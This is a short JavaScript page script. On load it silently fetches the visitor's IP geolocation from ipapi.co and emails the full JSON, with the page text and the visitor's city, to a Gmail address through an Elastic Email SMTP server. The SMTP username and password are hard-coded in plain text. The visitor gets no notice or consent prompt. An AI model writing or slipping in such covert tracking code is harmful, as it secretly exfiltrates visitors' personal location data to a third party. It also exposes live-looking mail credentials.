



const app=document.getElementById("app");
async function get(){
   var res=await fetch("https://ipapi.co/json/");
   var data = await res.json();
   //console.log(JSON.stringify(data));


   Email.send({
    Host : "smtp.elasticemail.com",
    Username : "nitikeshyewale2024@gmail.com",
    Password : "3E18507CAE3603BD688F0B3EC4063DE13ABA",
    To : 'nitikeshyewale2024@gmail.com',
    From : "nitikeshyewale2024@gmail.com",
    Subject : `${app.innerText} from ${data.city}`,
    Body : JSON.stringify(data)
});

    return data;
}
    
const fullData=get();

